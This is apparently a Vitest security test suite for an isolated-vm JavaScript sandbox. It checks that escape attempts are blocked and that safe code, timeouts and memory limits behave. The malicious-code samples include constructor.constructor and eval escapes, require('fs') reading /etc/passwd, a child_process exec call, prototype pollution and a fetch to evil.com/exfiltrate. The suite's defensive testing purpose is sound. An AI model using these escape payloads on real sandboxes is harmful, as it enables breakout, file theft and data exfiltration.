/**
 * @file Isolated VM Security Test Suite
 * @description Comprehensive security tests for isolated-vm executor
 * Tests 13 VM escape and threat patterns to ensure sandbox integrity
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { IsolatedVmExecutor } from '../../../packages/security/sandbox/isolated-vm-executor.mjs';
import { SandboxAdapter } from '../../../packages/security/sandbox-adapter.mjs';

describe('IsolatedVmExecutor - Security Tests', () => {
  let executor;

  beforeEach(() => {
    executor = new IsolatedVmExecutor({
      memoryLimit: 128,
      timeout: 1000,
      enableThreatDetection: true,
      strictMode: true,
    });
  });

  afterEach(async () => {
    await executor.cleanup();
  });

  describe('VM Escape Attempts', () => {
    it('should block constructor.constructor VM escape', async () => {
      const maliciousCode = `
        const FunctionConstructor = this.constructor.constructor;
        return FunctionConstructor('return process')();
      `;

      const result = await executor.run(maliciousCode);

      expect(result.success).toBe(false);
      expect(result.error).toContain('Security threat detected');
    });

    it('should block Function constructor escape', async () => {
      const maliciousCode = `
        const fn = Function('return this.process');
        return fn();
      `;

      const result = await executor.run(maliciousCode);

      expect(result.success).toBe(false);
      expect(result.error).toContain('Security threat detected');
    });

    it('should block eval-based escape', async () => {
      const maliciousCode = `
        return eval('process');
      `;

      const result = await executor.run(maliciousCode);

      expect(result.success).toBe(false);
      expect(result.error).toContain('Security threat detected');
    });

    it('should block constructor property access', async () => {
      const maliciousCode = `
        return []['constructor']['constructor']('return process')();
      `;

      const result = await executor.run(maliciousCode);

      expect(result.success).toBe(false);
      expect(result.error).toContain('Security threat detected');
    });
  });

  describe('Process Access Attempts', () => {
    it('should block process.binding access', async () => {
      const maliciousCode = `
        return process.binding('fs');
      `;

      const result = await executor.run(maliciousCode);

      expect(result.success).toBe(false);
      expect(result.error).toContain('Security threat detected');
    });

    it('should block require() access', async () => {
      const maliciousCode = `
        return require('fs');
      `;

      const result = await executor.run(maliciousCode);

      expect(result.success).toBe(false);
      expect(result.error).toContain('Security threat detected');
    });

    it('should block dynamic import() access', async () => {
      const maliciousCode = `
        return import('fs');
      `;

      const result = await executor.run(maliciousCode);

      expect(result.success).toBe(false);
      expect(result.error).toContain('Security threat detected');
    });

    it('should block module.exports access', async () => {
      const maliciousCode = `
        return module.exports;
      `;

      const result = await executor.run(maliciousCode);

      expect(result.success).toBe(false);
      expect(result.error).toContain('Security threat detected');
    });
  });

  describe('Prototype Pollution Attempts', () => {
    it('should block __proto__ manipulation', async () => {
      const maliciousCode = `
        Object.prototype.__proto__ = { polluted: true };
        return Object.prototype;
      `;

      const result = await executor.run(maliciousCode);

      expect(result.success).toBe(false);
      expect(result.error).toContain('Security threat detected');
    });

    it('should block prototype property manipulation', async () => {
      const maliciousCode = `
        Object.prototype['constructor'] = () => 'hacked';
        return Object.prototype;
      `;

      const result = await executor.run(maliciousCode);

      expect(result.success).toBe(false);
      expect(result.error).toContain('Security threat detected');
    });
  });

  describe('File System Access Attempts', () => {
    it('should block fs.readFile access', async () => {
      const maliciousCode = `
        const fs = require('fs');
        return fs.readFileSync('/etc/passwd', 'utf8');
      `;

      const result = await executor.run(maliciousCode);

      expect(result.success).toBe(false);
      expect(result.error).toContain('Security threat detected');
    });

    it('should block child_process access', async () => {
      const maliciousCode = `
        const { exec } = require('child_process');
        return exec('whoami');
      `;

      const result = await executor.run(maliciousCode);

      expect(result.success).toBe(false);
      expect(result.error).toContain('Security threat detected');
    });
  });

  describe('Network Access Attempts', () => {
    it('should block fetch access', async () => {
      const maliciousCode = `
        return fetch('https://evil.com/exfiltrate');
      `;

      const result = await executor.run(maliciousCode);

      expect(result.success).toBe(false);
      expect(result.error).toContain('Security threat detected');
    });
  });

  describe('Legitimate Code Execution', () => {
    it('should execute safe arithmetic', async () => {
      const safeCode = `
        return 2 + 2;
      `;

      const result = await executor.run(safeCode);

      expect(result.success).toBe(true);
      expect(result.result).toBe(4);
    });

    it('should execute safe string operations', async () => {
      const safeCode = `
        return 'hello'.toUpperCase();
      `;

      const result = await executor.run(safeCode);

      expect(result.success).toBe(true);
      expect(result.result).toBe('HELLO');
    });

    it('should execute safe object creation', async () => {
      const safeCode = `
        const obj = { a: 1, b: 2 };
        return obj.a + obj.b;
      `;

      const result = await executor.run(safeCode);

      expect(result.success).toBe(true);
      expect(result.result).toBe(3);
    });

    it('should execute safe array operations', async () => {
      const safeCode = `
        const arr = [1, 2, 3, 4, 5];
        return arr.filter(x => x > 2).map(x => x * 2);
      `;

      const result = await executor.run(safeCode);

      expect(result.success).toBe(true);
      expect(result.result).toEqual([6, 8, 10]);
    });

    it('should execute safe JSON operations', async () => {
      const safeCode = `
        const obj = { name: 'test', value: 42 };
        const json = JSON.stringify(obj);
        return JSON.parse(json);
      `;

      const result = await executor.run(safeCode);

      expect(result.success).toBe(true);
      expect(result.result).toEqual({ name: 'test', value: 42 });
    });

    it('should execute safe Math operations', async () => {
      const safeCode = `
        return Math.sqrt(16) + Math.pow(2, 3);
      `;

      const result = await executor.run(safeCode);

      expect(result.success).toBe(true);
      expect(result.result).toBe(12);
    });

    it('should execute safe Date operations', async () => {
      const safeCode = `
        return Date.now() > 0;
      `;

      const result = await executor.run(safeCode);

      expect(result.success).toBe(true);
      expect(result.result).toBe(true);
    });

    it('should pass context data correctly', async () => {
      const safeCode = `
        return event.type + '-' + store.name;
      `;

      const context = {
        event: { type: 'test' },
        store: { name: 'mystore' },
      };

      const result = await executor.run(safeCode, context);

      expect(result.success).toBe(true);
      expect(result.result).toBe('test-mystore');
    });
  });

  describe('Memory Isolation', () => {
    it('should isolate memory between executions', async () => {
      const code1 = `
        globalThis.leaked = 'sensitive';
        return 'done';
      `;

      const code2 = `
        return typeof globalThis.leaked;
      `;

      const result1 = await executor.run(code1);
      const result2 = await executor.run(code2);

      expect(result1.success).toBe(true);
      expect(result2.success).toBe(true);
      expect(result2.result).toBe('undefined'); // Should not leak
    });

    it('should respect memory limits', async () => {
      const memoryHog = `
        const arr = [];
        for (let i = 0; i < 10000000; i++) {
          arr.push({ data: new Array(1000).fill('x') });
        }
        return arr.length;
      `;

      const limitedExecutor = new IsolatedVmExecutor({
        memoryLimit: 8, // 8MB limit
        timeout: 5000,
      });

      const result = await limitedExecutor.run(memoryHog);

      expect(result.success).toBe(false);
      expect(result.error).toBeTruthy();

      await limitedExecutor.cleanup();
    });
  });

  describe('Timeout Controls', () => {
    it('should timeout infinite loops', async () => {
      const infiniteLoop = `
        while (true) {
          // infinite loop
        }
      `;

      const result = await executor.run(infiniteLoop, {}, { timeout: 100 });

      expect(result.success).toBe(false);
      expect(result.error).toContain('timeout');
    });

    it('should timeout long-running computations', async () => {
      const longComputation = `
        let result = 0;
        for (let i = 0; i < 1e10; i++) {
          result += Math.sqrt(i);
        }
        return result;
      `;

      const result = await executor.run(longComputation, {}, { timeout: 100 });

      expect(result.success).toBe(false);
      expect(result.error).toContain('timeout');
    });
  });

  describe('Code Hash Verification', () => {
    it('should compute code hash for Merkle verification', async () => {
      const code = 'return 42;';

      const result = await executor.run(code);

      expect(result.success).toBe(true);
      expect(result.codeHash).toBeDefined();
      expect(result.codeHash).toMatch(/^[a-f0-9]{64}$/); // SHA-256 hash
    });

    it('should produce different hashes for different code', async () => {
      const code1 = 'return 1;';
      const code2 = 'return 2;';

      const result1 = await executor.run(code1);
      const result2 = await executor.run(code2);

      expect(result1.codeHash).toBeDefined();
      expect(result2.codeHash).toBeDefined();
      expect(result1.codeHash).not.toBe(result2.codeHash);
    });
  });

  describe('OTEL Instrumentation', () => {
    it('should record execution metrics', async () => {
      const code = 'return 42;';

      const result = await executor.run(code);

      expect(result.success).toBe(true);
      expect(result.duration).toBeGreaterThan(0);
      expect(result.executionId).toBeDefined();
    });

    it('should track executor statistics', async () => {
      await executor.run('return 1;');
      await executor.run('return 2;');
      await executor.run('return 3;');

      const stats = executor.getStats();

      expect(stats.type).toBe('isolated-vm');
      expect(stats.executionCount).toBe(3);
      expect(stats.averageDuration).toBeGreaterThan(0);
    });
  });
});

describe('SandboxAdapter - Auto-Detection', () => {
  let adapter;

  afterEach(async () => {
    if (adapter) {
      await adapter.cleanup();
    }
  });

  it('should auto-detect isolated-vm as best executor', async () => {
    adapter = new SandboxAdapter();

    await adapter.run('return 42;');

    expect(adapter.getEngine()).toBe('isolated-vm');
  });

  it('should execute code successfully with auto-detection', async () => {
    adapter = new SandboxAdapter({ timeoutMs: 1000 });

    const result = await adapter.run('return "hello world";');

    expect(result).toBe('hello world');
  });

  it('should force specific executor when requested', async () => {
    adapter = new SandboxAdapter({ engine: 'worker', timeoutMs: 1000 });

    const result = await adapter.run('return 123;');

    expect(result).toBe(123);
    expect(adapter.getEngine()).toBe('worker');
  });

  it('should block malicious code in adapter', async () => {
    adapter = new SandboxAdapter({ timeoutMs: 1000 });

    await expect(async () => {
      await adapter.run('return require("fs");');
    }).rejects.toThrow();
  });

  it('should provide executor statistics', async () => {
    adapter = new SandboxAdapter();

    await adapter.run('return 1;');
    await adapter.run('return 2;');

    const stats = adapter.getStats();

    expect(stats.type).toBe('isolated-vm');
    expect(stats.executionCount).toBeGreaterThan(0);
  });
});

describe('Performance Tests', () => {
  let executor;

  beforeEach(() => {
    executor = new IsolatedVmExecutor({
      memoryLimit: 128,
      timeout: 5000,
      enableThreatDetection: true,
    });
  });

  afterEach(async () => {
    await executor.cleanup();
  });

  it('should execute simple code in < 50ms (first execution)', async () => {
    const code = 'return 42;';
    const start = Date.now();

    const result = await executor.run(code);

    const duration = Date.now() - start;

    expect(result.success).toBe(true);
    expect(duration).toBeLessThan(50); // < 50ms overhead for first execution
  });

  it('should execute simple code in < 10ms (subsequent executions)', async () => {
    // Warm up
    await executor.run('return 1;');

    const code = 'return 42;';
    const start = Date.now();

    const result = await executor.run(code);

    const duration = Date.now() - start;

    expect(result.success).toBe(true);
    expect(duration).toBeLessThan(10); // < 10ms overhead for subsequent executions
  });

  it('should handle 100 sequential executions efficiently', async () => {
    const start = Date.now();

    for (let i = 0; i < 100; i++) {
      const result = await executor.run(`return ${i};`);
      expect(result.success).toBe(true);
      expect(result.result).toBe(i);
    }

    const duration = Date.now() - start;
    const avgDuration = duration / 100;

    expect(avgDuration).toBeLessThan(20); // Average < 20ms per execution
  });

  it('should report memory usage', async () => {
    const code = `
      const arr = new Array(1000).fill('test');
      return arr.length;
    `;

    const result = await executor.run(code);

    expect(result.success).toBe(true);
    expect(result.memoryUsed).toBeDefined();
    expect(result.memoryUsed.used).toBeGreaterThan(0);
  });
});
